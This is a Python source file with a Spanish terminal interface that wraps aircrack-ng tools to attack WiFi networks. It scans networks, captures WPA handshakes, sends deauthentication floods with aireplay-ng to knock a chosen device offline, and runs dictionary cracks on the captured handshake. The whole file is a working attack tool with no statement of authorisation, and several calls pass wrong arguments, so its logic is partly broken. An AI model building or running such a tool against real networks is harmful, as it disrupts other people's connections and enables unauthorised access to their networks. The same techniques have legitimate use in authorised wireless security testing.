import npyscreen
import subprocess
import getpass

class NetworkScannerApp(npyscreen.NPSAppManaged):
    def onStart(self):
        self.addForm('MAIN', MainForm, name='Automatización de Seguridad de Red')

class MainForm(npyscreen.FormBaseNew):
    def create(self):
        self.network_interfaces = list_network_interfaces()
        self.networks = []
        self.selected_interface = None
        self.selected_network = None
        self.output_file = None

        # Configuración de los widgets
        self.interface_list = self.add(npyscreen.TitleSelectOne, 
                                       name="Interfaces de Red:", 
                                       values=self.network_interfaces, 
                                       scroll_exit=True,
                                       max_height=10)  # Ajustar altura máxima
        self.network_list = self.add(npyscreen.TitleSelectOne, 
                                     name="Redes WiFi:", 
                                     values=self.networks, 
                                     scroll_exit=True,
                                     max_height=10)  # Ajustar altura máxima
        self.scan_button = self.add(npyscreen.ButtonPress, 
                                    name="Escanear Redes", 
                                    when_pressed=self.scan_networks)
        self.capture_button = self.add(npyscreen.ButtonPress, 
                                       name="Iniciar Captura", 
                                       when_pressed=self.start_capture)
        self.deauth_button = self.add(npyscreen.ButtonPress, 
                                      name="Desvincular Dispositivo", 
                                      when_pressed=self.deauth_device)
        self.crack_button = self.add(npyscreen.ButtonPress, 
                                     name="Crackear Contraseña", 
                                     when_pressed=self.crack_password)
        self.exit_button = self.add(npyscreen.ButtonPress, 
                                    name="Salir", 
                                    when_pressed=self.exit_application)

    def scan_networks(self, widget):
        self.network_interfaces = list_network_interfaces()
        self.interface_list.values = self.network_interfaces
        self.interface_list.display()

        if self.network_interfaces:
            self.selected_interface = self.interface_list.get_selected_objects()[0]
            self.networks = scan_networks(self.selected_interface)
            self.network_list.values = self.networks
            self.network_list.display()

    def start_capture(self, widget):
        if self.networks:
            self.selected_network = self.network_list.get_selected_objects()[0]
            channel = npyscreen.notify_input("Canal del router: ")
            bssid = npyscreen.notify_input("BSSID del router: ")
            self.output_file = npyscreen.notify_input("Nombre del archivo de salida (sin extensión): ")
            capture_handshake(channel, bssid, self.selected_interface + 'mon', self.output_file)
            npyscreen.notify_confirm(f"Captura iniciada para la red: {self.selected_network}")

    def deauth_device(self, widget):
        if not self.selected_network:
            npyscreen.notify_confirm("No se ha seleccionado ninguna red.")
            return
        device_mac = npyscreen.notify_input("MAC del dispositivo a desvincular: ")
        deauthenticate_device(self.selected_network, device_mac, self.selected_interface + 'mon')
        npyscreen.notify_confirm(f"Desvinculación del dispositivo {device_mac} enviada.")

    def crack_password(self, widget):
        capture_file = f"{self.output_file}.cap"
        dictionary_file = npyscreen.notify_input("Ruta del diccionario: ")
        crack_password(dictionary_file, self.selected_network, capture_file)
        npyscreen.notify_confirm(f"Proceso de crackeo iniciado para el archivo: {capture_file}")

    def exit_application(self, widget):
        self.parentApp.exit()

def run_command_as_root(command):
    try:
        result = subprocess.run(['sudo', '-S'] + command, input=getpass.getpass(prompt="Contraseña de root: ").encode(), capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el comando: {e}")
        return None

def list_network_interfaces():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'no wireless extensions.' not in line:
                parts = line.split()
                if parts:
                    interface = parts[0]
                    interfaces.append(interface)
        return interfaces
    except subprocess.CalledProcessError as e:
        print(f"Error al listar interfaces de red: {e}")
        return []

def scan_networks(interface):
    try:
        print(f"Escaneando redes en {interface}... Presiona Ctrl+C para detener.")
        result = subprocess.run(['airodump-ng', interface], capture_output=True, text=True)
        networks = []
        in_network_section = False
        for line in result.stdout.split('\n'):
            if 'BSSID' in line:
                in_network_section = True
                continue
            if in_network_section:
                if len(line.strip()) == 0:
                    break
                networks.append(line.strip())
        return networks
    except subprocess.CalledProcessError as e:
        print(f"Error al escanear redes: {e}")
        return []

def capture_handshake(channel, bssid, monitor_interface, output_file):
    try:
        subprocess.run(['airodump-ng', '-c', channel, '-w', output_file, '--bssid', bssid, monitor_interface], check=True)
        print(f"Handshake capturado en el archivo: {output_file}.cap")
    except subprocess.CalledProcessError as e:
        print(f"Error al capturar handshake: {e}")

def deauthenticate_device(router_mac, device_mac, monitor_interface):
    try:
        subprocess.run(['aireplay-ng', '-0', '50', '-a', router_mac, '-c', device_mac, monitor_interface], check=True)
        print("Desvinculación del dispositivo enviada.")
    except subprocess.CalledProcessError as e:
        print(f"Error al enviar paquetes de deauth: {e}")

def crack_password(dictionary_file, bssid, capture_file):
    try:
        result = subprocess.run(['aircrack-ng', '-w', dictionary_file, '-b', bssid, capture_file], capture_output=True, text=True)
        print("Resultado de aircrack-ng:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar aircrack-ng: {e}")

if __name__ == '__main__':
    app = NetworkScannerApp().run()
